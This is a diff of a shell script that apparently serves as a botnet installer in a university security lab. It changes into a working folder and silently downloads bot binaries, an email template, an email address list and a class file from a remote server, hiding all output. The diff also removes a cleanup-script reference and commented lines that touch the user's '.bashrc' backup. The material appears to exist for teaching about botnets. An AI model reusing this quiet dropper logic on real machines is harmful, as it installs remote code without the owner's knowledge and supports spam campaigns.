@@ -18,7 +18,6 @@ if [ -z "$DIR" ]; then
     TEMPLATE="template.txt"
     EMAILS="emails.txt"
     RAND_EMAILS="random_emails.txt"
-    CLEAN="clean.sh"
     INFO="PubInfo.class"
     CURDIR=`pwd`
 
@@ -30,9 +29,6 @@ if [ -z "$DIR" ]; then
     fi
     cd "${DIR}${FOLDER}"
 
-    #cp ~/.bashrc_old ./.bashrc_old
-    #rm ~/.bashrc_old
-
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN2" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN3" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN4" &> /dev/null
@@ -43,7 +39,6 @@ if [ -z "$DIR" ]; then
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$TEMPLATE" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$EMAILS" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$INFO" &> /dev/null
-    #wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$CLEAN" &> /dev/null
     
     cp $EMAILS $RAND_EMAILS
 
